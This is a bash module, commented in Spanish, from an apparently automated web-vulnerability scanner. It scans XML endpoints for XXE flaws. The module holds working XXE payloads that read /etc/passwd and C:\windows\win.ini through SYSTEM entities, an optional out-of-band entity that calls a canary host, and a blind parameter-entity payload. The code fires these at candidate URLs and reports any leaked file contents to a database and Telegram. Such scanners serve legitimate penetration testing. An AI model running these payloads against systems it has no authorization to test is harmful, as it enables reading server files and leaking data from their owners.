#!/usr/bin/env bash
# ============================================================
#  modules/42_xxe_scan.sh
#  Tier 2.4 — XXE (XML External Entity) scanner
#
#  Detecta endpoints que aceptan XML y prueba 3 vectores:
#    1. file:///etc/passwd (Linux LFI vía SYSTEM entity)
#    2. file:///c:/windows/win.ini (Windows)
#    3. http://canary-domain (OOB confirmation — opt-in vía XXE_CANARY env)
#
#  Endpoints candidatos (de DB):
#    - urls con Content-Type detectado application/xml o text/xml
#    - urls con paths /api/, /soap/, /xmlrpc, /rpc, /upload, /import
#    - SOAP endpoints (.asmx, .wsdl)
#
#  Anti-FP:
#    - Body validation: el response debe contener SYSTEM file content
#      (markers root:, /bin/bash, [boot loader], etc.)
#    - Skip URLs que devuelven 4xx/5xx en GET base (no XML accept)
# ============================================================

MODULE_NAME="xxe_scan"
MODULE_DESC="XXE — file:// LFI + OOB canary en endpoints XML"

# ── Helper finding ─────────────────────────────────────────
_xxe_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" TARGET="$3"
  local TYPE="$4" SEV="$5" DETAIL="$6" CONF="${7:-medium}"

  db_add_finding "$DOMAIN_ID" "xxe" "$SEV" \
    "$TARGET" "$TYPE" "$DETAIL" "$CONF" 2>/dev/null

  local EMOJI="🔴"
  [[ "$SEV" == "high"   ]] && EMOJI="🟠"
  [[ "$SEV" == "medium" ]] && EMOJI="🟡"

  log_warn "  ⚡ [$SEV/$CONF] XXE $TYPE: $TARGET"

  if [[ "$CONF" != "low" ]] && [[ "$SEV" == "critical" || "$SEV" == "high" ]]; then
    _telegram_send "${EMOJI} *XXE — ${TYPE}*
🌐 \`${DOMAIN}\`
🔗 \`${TARGET}\`
📋 ${DETAIL:0:300}
📊 \`${SEV^^}\` / \`${CONF}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi
}

# ── Probe XXE en endpoint ──────────────────────────────────
_xxe_probe() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  # Payload 1: file:///etc/passwd (Linux)
  local PAYLOAD_PASSWD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'

  _h_post_noredirect "$URL" "$PAYLOAD_PASSWD" --connect-timeout 10 \
    -H "Content-Type: application/xml" \
    -H "Accept: */*"
  local STATUS="$HTTP_LAST_STATUS"
  local BODY="${HTTP_LAST_BODY:0:5000}"

  # Confirmar SYSTEM file leak — buscar root:x: en respuesta
  if echo "$BODY" | grep -qE '(^|[^a-z])root:[x*]?:[0-9]+:[0-9]+:'; then
    _xxe_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
      "xxe_file_read_linux" "critical" \
      "XXE confirma lectura de /etc/passwd. SYSTEM entity → LFI a archivos del servidor. Status: $STATUS" \
      "high"
    return 0
  fi

  # Payload 2: file:///c:/windows/win.ini (Windows)
  local PAYLOAD_WIN='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>'

  _h_post_noredirect "$URL" "$PAYLOAD_WIN" --connect-timeout 10 \
    -H "Content-Type: application/xml" \
    -H "Accept: */*"
  STATUS="$HTTP_LAST_STATUS"
  BODY="${HTTP_LAST_BODY:0:5000}"

  if echo "$BODY" | grep -qiE '\[boot loader\]|\[operating systems\]|\[mci extensions\]'; then
    _xxe_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
      "xxe_file_read_windows" "critical" \
      "XXE confirma lectura de C:\\windows\\win.ini. SYSTEM entity → LFI Windows. Status: $STATUS" \
      "high"
    return 0
  fi

  # Payload 3 (opt-in): OOB canary
  if [[ -n "${XXE_CANARY:-}" ]]; then
    local PAYLOAD_OOB='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://'"${XXE_CANARY}"'/xxe-probe-'$(date +%s)'">]>
<foo>&xxe;</foo>'

    _h_post_noredirect "$URL" "$PAYLOAD_OOB" --connect-timeout 10 \
      -H "Content-Type: application/xml" \
      -H "Accept: */*"
    # OOB no se valida en respuesta — usuario debe checkear logs en canary server
    # Solo emitimos info para que sepa que el probe se mandó
    log_info "  XXE OOB enviado a $XXE_CANARY desde $URL — verifica logs del canary"
  fi

  # Payload 4: parameter entity (XXE blind con error en parser)
  local PAYLOAD_PARAM='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'file:///bogus/%xxe;'>">
%param1;
]>
<foo>&exfil;</foo>'

  _h_post_noredirect "$URL" "$PAYLOAD_PARAM" --connect-timeout 8 \
    -H "Content-Type: application/xml"
  STATUS="$HTTP_LAST_STATUS"
  BODY="${HTTP_LAST_BODY:0:3000}"

  # Parser error con file:// content reflejado → XXE blind
  if echo "$BODY" | grep -qiE 'file:///etc/passwd|root:x:0:|/bin/bash'; then
    _xxe_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
      "xxe_blind_error" "high" \
      "XXE blind via parameter entity — error message contiene file content. Status: $STATUS" \
      "high"
    return 0
  fi

  return 1
}

# ── Pre-filtrado: el endpoint debe aceptar XML ─────────────
_xxe_endpoint_accepts_xml() {
  local URL="$1"

  # Test rápido: POST con XML mínimo, ¿200/400/500 indicating XML parsing?
  local PROBE='<?xml version="1.0"?><test/>'
  _h_post_noredirect "$URL" "$PROBE" --connect-timeout 6 \
    -H "Content-Type: application/xml"
  local STATUS="$HTTP_LAST_STATUS"
  local BODY="${HTTP_LAST_BODY:0:1000}"

  # Si responde con error parsing XML → endpoint procesa XML
  if [[ "$STATUS" =~ ^(400|500|422)$ ]]; then
    if echo "$BODY" | grep -qiE 'xml|parse|element|tag|<faultstring>|soap:fault'; then
      return 0
    fi
  fi

  # Si responde 200 puede ser que aceptó nuestro XML mínimo
  [[ "$STATUS" == "200" ]] && return 0

  # 415 Unsupported Media Type → no XML
  return 1
}

# ── Main ─────────────────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 42 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true

  # Endpoints candidatos: SOAP, XMLRPC, /api/ que ya hayan respondido XML
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND (
         url LIKE '%.asmx%' OR url LIKE '%.wsdl%' OR url LIKE '%.svc%'
         OR url LIKE '%/soap/%' OR url LIKE '%/xmlrpc%' OR url LIKE '%/rpc%'
         OR url LIKE '%/api/v1/%' OR url LIKE '%/api/v2/%'
         OR url LIKE '%/upload%' OR url LIKE '%/import%'
         OR url LIKE '%/sso/saml%' OR url LIKE '%/saml/sso%'
         OR url LIKE '%/wsdl%' OR url LIKE '%/services/%'
       )
       AND content_type LIKE '%xml%' OR url LIKE '%.asmx%' OR url LIKE '%.wsdl%'
       AND url NOT LIKE '%.png%' AND url NOT LIKE '%.css%'
     LIMIT 30;" 2>/dev/null | sort -u)

  # Adicionalmente: cualquier URL que haya devuelto Content-Type:xml en mod 09
  local XML_URLS
  XML_URLS=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND content_type LIKE '%xml%'
     LIMIT 30;" 2>/dev/null | sort -u)
  CANDIDATES=$(printf "%s\n%s" "$CANDIDATES" "$XML_URLS" | sort -u | grep -v '^$')

  if [[ -z "$CANDIDATES" ]]; then
    log_info "  Sin endpoints XML candidatos — saltando"
    return 0
  fi

  local COUNT
  COUNT=$(echo "$CANDIDATES" | grep -c .)
  log_info "  ${COUNT} endpoints candidatos (SOAP/XMLRPC/api con XML content-type)"

  local TOTAL_FINDINGS=0 PROCESSED=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    ((PROCESSED++))

    # Pre-check: ¿el endpoint procesa XML?
    if ! _xxe_endpoint_accepts_xml "$URL"; then
      continue
    fi

    log_info "  → probando XXE en $URL"
    _xxe_probe "$URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL_FINDINGS++))
  done <<< "$CANDIDATES"

  log_ok "$MODULE_DESC: ${TOTAL_FINDINGS} XXE confirmados sobre ${PROCESSED} endpoints"
}
